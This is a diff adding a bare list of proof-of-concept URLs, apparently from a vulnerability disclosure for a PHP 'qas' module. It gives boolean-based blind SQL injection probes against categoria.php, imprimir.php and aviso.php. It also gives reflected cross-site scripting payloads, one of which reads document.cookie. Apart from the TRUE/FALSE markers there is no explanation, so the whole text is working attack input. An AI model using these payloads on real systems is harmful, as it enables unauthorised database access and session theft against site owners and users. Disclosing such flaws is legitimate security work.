@@ -1,0 +1,17 @@
+http://www.example.com/modules/qas/categoria.php?cod_categoria=1 and 1=1 
+&lt;= TRUE
+http://www.example.com/modules/qas/categoria.php?cod_categoria=1 and 1=2 
+&lt;= FALSE
+http://www.example.com/modules/qas/imprimir.php?codigo=1 and 1=1 &lt;= 
+TRUE
+http://www.example.com/modules/qas/imprimir.php?codigo=1 and 1=2 &lt;= 
+FALSE
+http://www.example.com/modules/qas/aviso.php?codigo=1 and 1=1 &lt;= TRUE
+http://www.example.com/modules/qas/aviso.php?codigo=1 and 1=2 &lt;= 
+FALSE
+http://www.example.com/modules/qas/categoria.php?cod_categoria=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+http://www.example.com/modules/qas/index.php?opcao=1&gt;&#039;&gt;&lt;ScRiPt 
+%0A%0D&gt;alert(439286918587)%3B&lt;/ScRiPt&gt;
+http://www.example.com/modules/qas/categoria.php/&gt;&#039;&gt;&lt;ScRiPt&gt;alert(665068655391)&lt;/ScRiPt&gt;
+http://www.example.com/modules/qas/index.php/&gt;&#039;&gt;&lt;ScRiPt&gt;alert(657988605523)&lt;/ScRiPt&gt;
+
